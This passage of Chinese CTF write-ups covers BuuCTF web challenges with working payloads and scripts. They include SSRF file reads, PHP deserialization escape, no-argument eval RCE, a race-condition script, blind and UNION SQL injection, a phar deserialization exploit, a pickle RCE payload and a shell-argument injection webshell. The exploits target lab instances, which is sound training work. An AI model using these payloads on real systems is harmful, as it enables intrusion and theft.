== 'suctf.cc': return urllib.request.urlopen(finalUrl).read() else: return \"我扌 your problem? 333\" 需要绕过几个检测, 然后urlopen()打开, 由于要检测host, 所以不能直接打开文件, 这里有个知识点是如果用file://协议打开一个链接形式如下 1file://hostname:port/path file协议会默认从本地匹配路径, 因此上面的链接相当于 1file:///path 有了文件读取, 现在需要绕过这个检测, 这里参考blackhat的payload https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf 绕过的payload如下 1http://47.111.59.243:9000/getUrl?url=file://suctf.c%E2%84%85pt/../etc/passwd 解析后相当于 1http://47.111.59.243:9000/getUrl?url=file://suctf.cc/opt/../etc/passwd 成功读取, 当时比赛的时候找了很久都没有找到flag 然后需要找到nginx的配置文件, 参考官方手册 也就是说默认的有如下几个路径 123/usr/local/nginx/conf/nginx.conf/etc/nginx/ngin.conf/usr/local/etc/nginx/nginx.conf 分别读一下, 就能找到flag的位置 [安洵杯 2019]easy_serialize_php可以看到源码 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?php$function = @$_GET['f'];function filter($img)&#123; $filter_arr = array('php','flag','php5','php4','fl1g'); $filter = '/'.implode('|',$filter_arr).'/i'; return preg_replace($filter,'',$img);&#125;if($_SESSION)&#123; unset($_SESSION);&#125;$_SESSION[\"user\"] = 'guest';$_SESSION['function'] = $function;extract($_POST);if(!$function)&#123; echo '&lt;a href=\"index.php?f=highlight_file\"&gt;source_code&lt;/a&gt;';&#125;if(!$_GET['img_path'])&#123; $_SESSION['img'] = base64_encode('guest_img.png');&#125;else&#123; $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));&#125;$serialize_info = filter(serialize($_SESSION));if($function == 'highlight_file')&#123; highlight_file('index.php');&#125;else if($function == 'phpinfo')&#123; eval('phpinfo();'); //maybe you can find something in here!&#125;else if($function == 'show_image')&#123; $userinfo = unserialize($serialize_info); echo file_get_contents(base64_decode($userinfo['img']));&#125; 再看一眼phpinfo, 可以看到有个文件, 想办法读它 审计代码的关键点在于 123extract($_POST);...$userinfo = unserialize($serialize_info); 一个是变量覆盖, 一个是反序列化而代码最后是 1echo file_get_contents(base64_decode($userinfo[&apos;img&apos;])); 回溯一下 1$userinfo &lt;- unserialize($serialize_info) &lt;- $serialize_info &lt;- filter(serialize($_SESSION)) 那我们要覆盖的就是$_SESSION, 这里有个filter, 他是在反序列化之后进行的, 而这就会出现反序列化字符串逃逸的漏洞首先了解一下 https://xz.aliyun.com/t/6718php对于反序列化的处理中, 不会对内容进行检查, 他只是单纯的根据声明的数字去找内容, 正常的反序列化字符串是这样的 1a:1:&#123;s:1:&quot;b&quot;;s:1:&quot;c&quot;;&#125; 如果我们把内容c改成这样 1a:1:&#123;s:1:&quot;b&quot;;s:4:&quot;c&quot;;&#125;&quot;;&#125; php也能够正常的反序列化, 因为c的部分声明了4的长度, 后面的4个字符都会包含在里面, 而如果出现某种情况导致4长度变成了1, 那反序列化就会结束而忽略掉最后的;}, 也就是说下面这样的字符串也可以正常的反序列化 1a:1:&#123;s:1:&quot;b&quot;;s:1:&quot;c&quot;;&#125;&quot;;&#125; 而怎么造成这样的变化呢, 代码中有一个filter函数, 他会使得_SESSION数组的键值长度变短 12345function filter($img)&#123; $filter_arr = array(&apos;php&apos;,&apos;flag&apos;,&apos;php5&apos;,&apos;php4&apos;,&apos;fl1g&apos;); $filter = &apos;/&apos;.implode(&apos;|&apos;,$filter_arr).&apos;/i&apos;; return preg_replace($filter,&apos;&apos;,$img);&#125; 如果我们让键值为imgflagflag, 就能吞掉后面8位的内容, 因为两个flag被替换成空了, 如果8个字符可以到达这个键对应的值的位置, 那我们就能够任意构造字符串了, 例如 1a:1:&#123;s:11:&quot;imgflagflag&quot;;s:45:&quot;&quot;;xxxxxxx;&#125;&quot;;&#125; 这里的串如果经过filter的话会变成 1a:1:&#123;s:11:&quot;img&quot;;s:45:&quot;&quot;;xxxxxxx;&#125;&quot;;&#125; 也就是说x前面的内容都被包括进前一个字符串了, 后面的内容就自由构造, 只要符合语法就可以了 附上生成的exp 1234567&lt;?php// what file you want to read$filename = \"/d0g3_fllllllag\";$a['img'] = base64_encode($filename);$res = substr(serialize($a), 5);$_SESSION['imgflagflag'] = '\";s:1:\"a\";'.$res;echo \"_SESSION['imgflagflag']=\".$_SESSION['imgflagflag']; [ByteCTF 2019]Boring Code题目代码很简洁, 先是在index.php里面有一句 1flag in this file and code in /code 访问code, 可以看到代码 123456789101112131415161718192021222324252627282930313233&lt;?phpfunction is_valid_url($url) &#123; if (filter_var($url, FILTER_VALIDATE_URL)) &#123; if (preg_match('/data:\\/\\//i', $url)) &#123; return false; &#125; return true; &#125; return false;&#125;if (isset($_POST['url']))&#123; $url = $_POST['url']; if (is_valid_url($url)) &#123; $r = parse_url($url); if (preg_match('/baidu\\.com$/', $r['host'])) &#123; $code = file_get_contents($url); if (';' === preg_replace('/[a-z]+\\((?R)?\\)/', NULL, $code)) &#123; if (preg_match('/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i', $code)) &#123; echo 'bye~'; &#125; else &#123; eval($code); &#125; &#125; &#125; else &#123; echo \"error: host not allowed\"; &#125; &#125; else &#123; echo \"error: invalid url\"; &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 由于实在是绕不过去baidu.com的检测, 去买了个kapbaidu.com的域名, 花了55块钱, 很心痛 有了域名就很快乐, 可以直接读命令了, 然后要绕过正则, 是一个无参数RCE的正则, 可以参考两道之前的题目 codebreaking的phplimit rctf2018的r-cursive 读文件的payload大概如下 1readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd()))))))); 但是题目把里面的大部分都过滤了, 先fuzz了一下可用函数 1234567891011&lt;?php$list = get_defined_functions()['internal'];foreach($list as $key =&gt; $code)&#123; if (preg_match('/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i', $code)) &#123; unset($list[$key]); &#125; if (preg_match('/[^(a-z)]/i', $code))&#123; unset($list[$key]); &#125;;&#125;var_dump($list); 研究了很久之后决定用chr() + 时间函数的组合 1readfile(end(scandir(chr(microtime(chdir(next(scandir(chr(next(each(localtime()))))))))))); 简单来说就是上面的变型, 其中 end 代替 next(array_reverse()) chr(microtime()) 和chr(next(scandir(chr(next(each(localtime())))))) 都是代替 . next(scandir() 代替 .. 但是这个太随缘, 爆了很久都没用, 最后队友@kk发了个替换.的方法 1next(each(localeconv())) 最终payload如下 1readfile(end(scandir(chr(microtime(chdir(next(scandir(next(each(localeconv())))))))))); 传到服务器上爆破即可 不过在buu上做就心酸的多了, 赵总给了个内网的靶机, 但是xshell挂上代理连不上 用proxychains也没连上 在这个师傅的博客上找到了绕过的方法 Buuoj Writeups(一) 1url=compress.zlib://data:@baidu.com/baidu.com?,payload; 然后就是随缘爆破了, 这里也说一下buu的访问频率在每秒50个请求以内, 超过就会ban ip [上海大学生赛2019]decade第五届上海大学生信息安全竞赛的题目, 这题是上一题的升级版, 不在buu上面, 顺带分析了, 先看源码 12345678910111213141516171819&lt;?phphighlight_file(__FILE__);$code = $_GET['code'];if (!empty($code)) &#123; if (';' === preg_replace('/[a-z]+\\((?R)?\\)/', NULL, $code)) &#123; if (preg_match('/readfile|if|time|local|sqrt|et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i', $code)) &#123; echo 'bye~'; &#125; else &#123; eval($code); &#125; &#125; else &#123; echo \"invalid\"; &#125;&#125;else &#123; echo \"invalid\"; &#125;?&gt; 翻出之前的payload 1readfile(end(scandir(chr(microtime(chdir(next(scandir(next(each(localeconv())))))))))); 首先还是fuzz一下可用的函数 123456789101112131415&lt;?php$list = get_defined_functions()['internal'];foreach($list as $key =&gt; $code)&#123; if (preg_match('/readfile|if|time|local|sqrt|et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i', $code)) &#123; unset($list[$key]); &#125; if (preg_match('/[^(a-z)]/i', $code))&#123; unset($list[$key]); &#125;;&#125;$out = fopen(\"fuzz.txt\", \"w\");foreach($list as $key)&#123; fwrite($out, $key.\"\\n\");&#125;fclose($out); 然后查找一下read相关的函数, readgzfile这个函数可以用 其他的如gzread, bzread都因为参数问题无法调用, 但是实际上file函数也是可用的, 不过file函数返回的是数组, 对于echo的话, 不能处理数组, 我们有以下的方法来进行拼接 join serialize implode 接下来就是构造46或者.了, 翻一下boring_code的相关题解, 可以看到构造的方法有这么几种 12echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))))))))))); 其实大概就是数学方法和随机(玄学)方法, 找到了网上的两种做法分别是 玄学做法 https://xz.aliyun.com/t/6737 1chr(strrev(uniqid())); ​ http://www.pdsdt.lovepdsdt.com/index.php/2019/11/06/php_shell_no_code/ 1chr(ord(hebrevc(crypt(phpversion())))); 数学方法 (官方解法) 参考http://blog.sina.com.cn/s/blog_a661ecd501012xsr.html 1chr(floor(tan(tan(atan(atan(ord(cos(fclose(tmpfile()))))))))))); 拼接一下payload即可 123readgzfile(end(scandir(chr(strrev(uniqid(chdir(next(scandir(chr(strrev(uniqid())))))))))));readgzfile(end(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion()))))))))))))));echo(join(file(end(scandir(next(each(scandir(chr(floor(tan(tan(atan(atan(ord(cos(chdir(next(scandir(chr(floor(tan(tan(atan(atan(ord(cos(fclose(tmpfile())))))))))))))))))))))))))))); [HCTF 2018]admin主要参考自 https://skysec.top/2018/11/12/2018-HCTF-Web-Writeup 登录后可以看到有源码位置, 下载来看看 https://github.com/woadsl1234/hctf_flask/ 下载后看路由routes.py, 这个很可疑的函数就是其中一个突破点 解法一 unicode欺骗关于这个函数, 可以看 [unicode 欺骗](https://panda1g1.github.io/2018/11/15/HCTF admin/) 简而言之就是 1ᴬ -&gt; A -&gt; a 那我们就可以利用这样的操作来登录admin了 注册ᴬdmin 登录``ᴬdmin, 此时变为Admin` 更改密码, 此时即为admin 用新密码登录admin即可 解法二 Session欺骗原因是泄露了SECRET_KEY, 那么我们就可以解开这个session并伪造了 使用下面这个工具即可 https://github.com/noraj/flask-session-cookie-manager 先注册我们的账号后获取cookie 1session=.eJw9kE2LwjAYhP_KkrOHJuteCh4WosWF9y0psSG5iFtr03x0oSpdI_73VVm8zjDPMHMl28PYHi3JT-O5nZFtvyf5lbx9k5wA1xfkQIEvEyaYQK48JkGRGw_Fly8VBkwhGtcwLDAYWXmQ3aRjbUFVvZYN1dJEkHpuuJi0W2bIYELXXYDvIyYbUYYeY-3veY9u84sRe802c1BiQv75DgydkdYiWyfgdTC8u5RF9cg4kEsKTNBS6QW5zUhzHA_b049vh9cEdCKhwghqFTWre-TdBG79oaWeSrWh91qrUwhQiMzwEIyrLIrFE9fHXde-SI0yQ_vvDLvYPiQXs2wgM3I-tuPzOEIzcvsDlENuLg.XkFf9Q.RLHeiZt47umzNlKn7JODZ-bQWts 解密 123python flask_session_cookie_manager3.py decode -c &apos;.eJxxxxxxxx&apos; -s &apos;ckj123&apos;Output:&quot;ckj123&quot; -t &quot;&#123;&apos;_fresh&apos;: True, &apos;_id&apos;: b&apos;06243501373011d74546d0bd9ce79ff764cee4d180bea1dba75a6f168d40b147c068207f78f59b6ed4cd6516cbce81d04073cce8a7b305ed828db6ec1153d59f&apos;, &apos;csrf_token&apos;: b&apos;6435cf1afceb480229a609e54cac9e0d4d9ef4a5&apos;, &apos;image&apos;: b&apos;qfgy&apos;, &apos;name&apos;: &apos;cjm00n&apos;, &apos;user_id&apos;: &apos;10&apos;&#125;&quot; 然后将name改为admin并加密 123python flask_session_cookie_manager3.py encode -s &apos;ckj123&apos; -t &quot;&#123;&apos;_freshxxxxxx&quot;Output:.eJw9kE1rAjEURf9KydqFSe1GcFGIDhbeGzLECclGdBwnn1MYlakR_3utFNeXcy733sj2OLQnS-bn4dJOyNYdyPxG3vZkToDrK3KgwJcZM4wgVwGzoMhNgOIrlAoj5piMbxgWGI2sAshu1Km2oCqnZUO1NAmknhkuRu2XU2Qwou-uwA8Js00oo8NUhwcf0G9-MKHTbDMDJUbkn-_A0BtpLbJ1Bl5Hw7trWVR_jAe5pMAELZVekPuENKfhuD1_h7Z_TUAvMipMoFZJs9oh70bw6w8t9ViqDX3UWp1jhEJMDY_R-MqiWDx1Lu269mVqlOnb_6TfpUdAdofkejIhl1M7PH8jdEruvyuNbi8.XkFg2w.fFLXcLQnZfAYUlnkHDMu79ar_w0 使用获得的值替换cookie即可 解法三 条件竞争这个想法很骚气, 先看下面两处代码 首先是登录处, 将session[&#39;name&#39;]赋值为我们传的值 而更改密码处是直接使用了session[&#39;name&#39;] 我们假设有进程A和B使用了同样的session A请求登录admin, 那么此时session[&#39;name&#39;]为admin 同时B请求改密码, 这时改的就是admin的密码 注意在两次操作中sessionid是会改变的 代码实现如下(这里本地搭了一下环境没搭起来, 就不去祸害buu了) 123456789101112131415161718192021222324252627282930313233343536373839404142434445import requestsimport reimport threadingurl = \"http://269dedc4-b06b-4cdf-ad18-94952755b0b0.node3.buuoj.cn/\"def login(s, username, passwd): data = &#123; \"username\": username, \"password\": passwd, &#125; return s.post(url + \"login\", data=data).textdef change(s, passwd): data = &#123; \"newpassword\": passwd &#125; return s.post(url + \"change\", data=data).textdef logout(s): return s.get(url + \"logout\")def format_flag(res): pattern = \"flag&#123;.+&#125;\" flag = re.findall(pattern, res) if flag: return flag[0] else: return Falsedef tryToChange(s): login(s, \"cjm00n\", 'cjm00n') change(s, 'cjm00n')def tryToLogin(s): logout(s) login(s, 'admin', 'cjm00n')if __name__ == \"__main__\": s = requests.Session() for i in range(1000): print(i) t1 = threading.Thread(target=tryToChange, args=(s,)) t2 = threading.Thread(target=tryToLogin, args=(s,)) t1.start() t2.start() [CISCN2019 华北赛区 Day2 Web1]Hack World先fuzz一下 可以看到有布尔的结果, 那么应该是布尔盲注, 然后再看过滤的内容, 其中482长度的为被过滤的 这里其实不太明白为什么检测的内容这么少, 回去看源码 12345678910&lt;?phpfunction safe($sql)&#123; $blackList = array(' ','||','#','-',';','&amp;','+','or','and','`','\"','insert','group','limit','update','delete','*','into','union','load_file','outfile','./'); foreach($blackList as $blackitem)&#123; if(stripos($sql,$blackitem))&#123; return False; &#125; &#125; return True;&#125; 这里用的函数是stripos, 那么就很明显了, 如果出现在第一位, 则函数结果为0, 在类型转换后就是False, 所以前期fuzz就不顺利了hhh 重新fuzz结果 然后就构造一下盲注的payload, 这里可以用 1if(ascii(substr((select(flag)from(flag)),1,1))&gt;1,1,0) 或者使用异或也可以 11^(ascii(substr((select(flag)from(flag)),1,1))&gt;1) 写个脚本跑一下 12345678910111213141516171819202122232425262728293031import requestsfrom time import sleepurl = \"http://1d7350ba-68f1-47e8-b269-3381908ddae5.node3.buuoj.cn/index.php\"def attack(cur, mid): payload = \"if(ascii(substr((select(flag)from(flag)),%d,1))&gt;%d,1,0)\" % (cur, mid) res = requests.post(url, data=&#123;\"id\":payload&#125;).text if \"glzjin\" in res: return True else: return Falsedef main(): flag = \"\" for i in range(1, 43): end = 127 start = 1 mid = (end + start) // 2 while end &gt; start: if attack(i, mid): start = mid + 1 else: end = mid mid = (end + start) // 2 sleep(0.3) flag += chr(mid) print(flag)if __name__ == \"__main__\": main() [网鼎杯 2018]Fakebook一开始以为是二次注入, 不过发现他点击用户名之后, 有个请求页面的功能, 同时观察到url有个no=1 这里一定有请求数据库, 那么先注入一下, 发现没有什么过滤, 回显在第二列,依次注入后, 发现data中是一个反序列化字符串 1230%20union/**/select%201,(select%20group_concat(data)%20from%20users),3,4%23Output:O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:6:&quot;cjm00n&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:10:&quot;cjm00n.top&quot;;&#125; 我们再观察一下, 他有个robots.txt, 内容如下 12User-agent: *Disallow: /user.php.bak 访问后可以看到一部分源码 这里可以看到有个curl, 那么试试file协议 在注入中将结果更改为file:///var/www/html/flag.php 一开始没找到, 看wp中是在这个位置 payload如下 10%20union/**/select%201,(select%20group_concat(data)%20from%20users),3,&apos;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:6:&quot;cjm00n&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&apos;%23 然后base64解开即可 [GXYCTF2019]BabySQli直接上payload吧 1name=1&apos;union select 1,&apos;admin&apos;,&apos;e10adc3949ba59abbe56e057f20f883e&apos;%23&amp;pw=123456 其中e10adc3949ba59abbe56e057f20f883e=MD5(123456) [CISCN2019 华北赛区 Day1 Web1]Dropbox首先点进去, 随便注册个账号, 发现有文件上传功能, 先上传一个试试, 看一下下载的功能 123456789101112131415161718192021222324252627282930function download() &#123; var filename = $(this).parent().attr(\"filename\"); var form = $('&lt;form method=\"POST\" target=\"_blank\"&gt;&lt;/form&gt;'); form.attr('action', 'download.php'); var input = $('&lt;input type=\"hidden\" name=\"filename\" value=\"' + filename + '\"&gt;&lt;/input&gt;') $(document.body).append(form); $(form).append(input); form.submit(); form.remove();&#125;function deletefile() &#123; var filename = $(this).parent().attr(\"filename\"); var data = &#123; \"filename\": filename &#125;; $.ajax(&#123; url: 'delete.php', type: 'POST', data: data, success: function (json) &#123; if (json['success']) &#123; toast('删除成功', 'info'); &#125; else &#123; toast(json['error'], 'danger'); &#125; setTimeout(function () &#123;location.reload();&#125;, 1000); &#125; &#125;);&#125; 试试能不能任意文件下载, 证明是可以的, 不过需要用绝对路径, 默认的路径不在html下面 然后就是审计了, 可以看到有个神奇的close() 这个应该就是获取flag的地方了, 那找一下调用的部分 这里有个调用点, 结合文件上传, 应该是phar反序列化, 那是不是直接用 1User -&gt; __destruct() -&gt; File -&gt; close() 这条调用链呢, 答案是不行的, 如果这样的话是可以实现读取, 但是不能够输出, 所以需要借助第三个类 这个类有两个主要的方法 __call(): 用于实现函数调用, 对于自身没有的函数会调用$file-&gt;$func() __destruct(): 用于输出 那么调用链就可以实现了 1User -&gt; __destruct() -&gt; Filelist -&gt; close()[不存在] -&gt; __call() -&gt; File -&gt; close() 然后使用phar生成的exp如下 12345678910111213141516171819202122232425262728293031323334&lt;?phpclass File &#123; public $filename; public function __construct($filename) &#123; $this-&gt;filename = $filename; &#125;&#125;class User &#123; public $db;&#125;class FileList &#123; private $files; private $results; private $funcs; public function __construct() &#123; $file = new File(\"/flag.txt\"); $this-&gt;files = array($file); $this-&gt;results = array(); $this-&gt;funcs = array(); &#125;&#125;$user = new User();$user-&gt;db = new FileList();$filename = \"dropbox.phar\";file_exists($filename) ? unlink($filename) : null;$phar=new Phar($filename);$phar-&gt;startBuffering();$phar-&gt;setStub(\"GIF89a&lt;?php __HALT_COMPILER(); ?&gt;\");$phar-&gt;setMetadata($user);$phar-&gt;addFromString(\"foo.txt\",\"bar\");$phar-&gt;stopBuffering();?&gt; 随手写了个py脚本进行自动化上传 123456789101112131415161718192021222324252627282930313233343536373839404142434445import requestsimport reimport osurl = \"http://dad30c9a-7a47-42a6-a844-5dd18599a35b.node3.buuoj.cn/\"session = requests.Session()def generate(): command = \"php ./exp.php\" os.system(command)def login(): data = &#123; \"username\": \"cjm00n\", \"password\": \"cjm00n\" &#125; session.post(url + \"login.php\", data=data)def upload(): file = open(\"dropbox.phar\", \"rb\") files = &#123; 'file': ('dropbox.gif', file, \"image/gif\") &#125; session.post(url + \"upload.php\", files=files)def delete(): res = session.post(url + \"delete.php\", data=&#123;\"filename\": \"phar://dropbox.gif\"&#125;).text # get flag print(re.findall(\"flag&#123;.+&#125;\", res)[0])def main(): generate() login() upload() delete()if __name__ == \"__main__\": main() [CISCN2019 华北赛区 Day1 Web2]ikun这题蛮有意思的 首先看一下页面 发现有个提示, 翻了几页没有看到lv6的, 测了一下发现页数还是挺多的, 可以到200 写个脚本跑一下 1234567891011import requestsfrom time import sleepurl = \"http://8d13affc-8a20-4111-a664-73e47683080d.node3.buuoj.cn/shop?page=\"for i in range(200): res = requests.get(url + str(i)).text if \"lv6.png\" in res: print(i) break sleep(0.1) 结果在181页, 但是价格巨大, 在post参数中发现有price和discount, 改一个很小(大?)的折扣 然后就可以顺利买到了, 然后提示一个新的页面b1g_m4mber 这里不是XFF那些操作, 而是通过改jwt参数来伪造, 有点像前面的[HCTF 2018]admin 在 https://jwt.io/ 查询一下当前的jwt 但是改jwt前需要获取key, 使用 c-jwt-cracker 爆破一下 顺利伪造 在页面的注释找到了源码的位置 审计, 发现有个pickle反序列化 参考 https://blog.csdn.net/qq_26406447/article/details/91964502, 当序列化以及反序列化的过程中中碰到一无所知的扩展类型( python2,这里指的就是新式类)的时候，可以通过类中定义的 reduce 方法来告知如何进行序列化或者反序列化也就是说我们，只要在新式类中定义一个reduce 方法，我们就能在序列化的使用让这个类根据我们在 reduce 中指定的方式进行序列化 脚本如下 12345678910import pickleimport urllibclass payload(object): def __reduce__(self): return (eval, (\"open('/flag.txt','r').read()\",))a = pickle.dumps(payload())a = urllib.quote(a)print a 先点击成为大会员的按钮 然后将抓到的post包的become参数改为脚本的输出就可以了 关于具体的pickle反序列化可以参考 python pickle反序列漏洞 [BUUCTF 2018]Online Tool主要参考 https://althims.com/2019/07/25/buu-online-tool-wp/ https://tiaonmmn.github.io/2019/09/08/BUUOJ%E5%88%B7%E9%A2%98-Web-Online-Tool/ 标准的RCE题目, 而且可以看到两个比较特别的函数 分别查一下手册 有意思的是这个中文居然还有儿化音hhh 那么来分析一下, 直接用payload来做解释 1&apos; &lt;?php phpinfo();?&gt; -oG shell.php 首先这个payload会经过escapeshellarg, 这个函数有以下三个步骤 对单引号进行转义 1\\&apos; &lt;?php phpinfo();?&gt; -oG shell.php 将转义的单引号用单引号包裹起来 1&apos;\\&apos;&apos; &lt;?php phpinfo();?&gt; -oG shell.php 将整个语句用单引号包裹起来 1&apos;&apos;\\&apos;&apos; &lt;?php phpinfo();?&gt; -oG shell.php &apos; 然后经过escapeshellcmd, 这个函数的步骤如下 在以下字符前面加入转义符, 在win下所有这些字符以及 % 和 ! 字符都会被空格代替, 不过实测发现是被^代替 1&amp;#;`|*?~&lt;&gt;^()[]&#123;&#125;$\\, \\x0A, \\xFF linux win 匹配单引号数量(包括被\\转义的), 如果是奇数则转义最后一个单引号, 如果是偶数则不转义 1&apos;&apos;\\&apos;&apos; &lt;?php phpinfo();?&gt; -oG shell.php &apos; 则会变成 1&apos;&apos;\\&apos;&apos; &lt;?php phpinfo();?&gt; -oG shell.php \\&apos; 如果是 1&apos;&apos;\\&apos;&apos;&apos; &lt;?php phpinfo();?&gt; -oG shell.php &apos; 则不会转义 当然在实际中, 语句的中间部分也会被转义, 结果如下 可以看到前面的&#39;&#39;\\\\&#39;&#39;已经闭合, 中间的部分则会写入到shell.php中, 而为了避免最后出现的单引号来影响文件名, 我们需要在payload的最后加一个, 在url中需要写成%20, 不然会被浏览器自动忽略 最终payload如下 123&apos; &lt;?php echo `cat /flag`;?&gt; -oG shell.php # 或者&apos; &lt;?php echo `cat /flag`;?&gt; -oG shell.php &apos; 然后访问即可 [BJDCTF2020]Easy MD5 MD5($password, true) 123ffifdyop# or129581926211651571912466741651878684928 === 1param1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;param2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2 [BJDCTF2020]The mystery of ip模板注入, 读了下源码 123456789101112if (!empty($_SERVER['HTTP_CLIENT_IP'])) &#123; $ip=$_SERVER['HTTP_CLIENT_IP'];&#125;elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))&#123; $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];&#125;else&#123; $ip=$_SERVER['REMOTE_ADDR'];&#125; 获取ip的方式如上, 我们只要随便选一个填写注入代码就可以了 我用的是client-ip [极客大挑战 2019]BabySQL双写绕过 [ASIS 2019]Unicorn shop参考 https://shawroot.hatenablog.com/entry/2019/10/29/ASIS_2019-Unicorn_shop 随便买个东西会发现报错 这个有点迷惑, 查了下好像是环境的问题, 如果改动price会有另外一个错误 提示我们需要用一个char来表示数字, 结合题目的unicorn, 应该指的是unicode, 可以在这个网址找到 并且我们可以看到有些字符会有一个Numeric Value的值, 这就可以用来转换了, 像这样找到一个大于1337(最贵的item)的值就可以了 [极客大挑战 2019]RCE ME参考 https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html [RoarCTF 2019]Easy Calc123456789101112131415&lt;?phperror_reporting(0);if(!isset($_GET['num']))&#123; show_source(__FILE__);&#125;else&#123; $str = $_GET['num']; $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]','\\$','\\\\','\\^']; foreach ($blacklist as $blackitem) &#123; if (preg_match('/' . $blackitem . '/m', $str)) &#123; die(\"what are you want to do?\"); &#125; &#125; eval('echo '.$str.';');&#125;?&gt; 源码很简单, 只需要将需要绕过的地方用chr()表示就可以了, 但是这里有个waf, 当时一直绕不过去, 看了wp才知道, 在php解析变量的时候, 会替换空白符, 也就是说在php中 1?num=1 和 1?%20num=1 是一样的, 但是对于其他的语言并不一定, 所以可以通过这样的方法来绕过waf 那么payload如下 121;var_dump(scandir(chr(47))); // ls1;readfile(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)); // /f1agg 生成payload的脚本 12345word = \"/f1agg\"res = \"\"for i in word: res += f'chr(&#123;ord(i)&#125;).'print(res[:-1])","link":"/2019/10/26/BuuCTF刷题记录/"}],"tags":[{"name":"AWD","slug":"AWD","link":"/tags/AWD/"},{"name":"Config","slug":"Config","link":"/tags/Config/"},{"name":"Writeup","slug":"Writeup","link":"/tags/Writeup/"},{"name":"Web开发","slug":"Web开发","link":"/tags/Web开发/"},{"name":"HackTheBox","slug":"HackTheBox","link":"/tags/HackTheBox/"}],"categories":[{"name":"CTF","slug":"CTF","link":"/categories/CTF/"},{"name":"Linux","slug":"Linux","link":"/categories/Linux/"},{"name":"Pentest","slug":"Pentest","link":"/categories/Pentest/"},{"name":"Web","slug":"Web","link":"/categories/Web/"}]}